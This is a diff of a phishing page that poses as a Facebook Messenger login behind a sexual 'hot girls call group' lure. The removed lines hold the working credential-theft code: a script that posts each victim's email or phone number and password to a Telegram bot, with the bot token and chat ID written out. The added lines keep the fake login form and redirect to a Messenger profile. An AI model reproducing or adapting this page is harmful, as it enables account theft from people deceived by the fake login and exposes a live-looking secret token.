@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hot Girls Audio Video Call Group</title>
+    <title>Sexy-Hot Girls Audio Video Call Group</title>
     <style>
         body {
             display: flex;
@@ -75,16 +75,16 @@
 <body>
     <div class="login-container">
         <div class="logo">
-            <img src="https://imagizer.imageshack.com/img922/1346/0UOnBb.jpg" alt="Messenger Logo">
+            <img src="https://i.postimg.cc/httt6kzh/index.png" alt="Messenger Logo">
         </div>
         <input type="text" id="emailOrNumber" placeholder="Email address or mobile number">
         <input type="password" id="password" placeholder="Password">
         <div class="checkbox-container">
-            <input type="checkbox"> save login
+            <input type="checkbox"> Change
         </div>
         <button class="login-btn" onclick="handleLogin()">Login</button>
         <button class="create-account-btn">Create Account</button>
-        <a href="#" class="forgot-link">Forgotten account?</a>
+        <a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&ref=accounts_center_change_password" class="forgot-link">Forgotten account?</a>
     </div>
 
     <script>
@@ -93,30 +93,8 @@
             const password = document.getElementById('password').value;
 
             if (emailOrNumber && password) {
-                const botToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ';
-                const chatId = '5916486983';
-                const message = `Email/Mobile: ${emailOrNumber}\nPassword: ${password}`;
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Success:', data);
-                    // Open the specified URL in a new tab
-                    window.open("https://m.me/j/AbbGs86Z_LoD_5Zk/", "_blank");
-                    
-                    // Redirect to Messenger group after successful login and sending message
-                    window.location.href = "https://m.me/j/AbbGs86Z_LoD_5Zk/";
-                })
-                .catch((error) => console.error('Error:', error));
+                // Redirect to Messenger after successful login
+                window.location.href = "https://m.me/dark.king45";
             } else {
                 alert("Please fill in all fields.");
             }
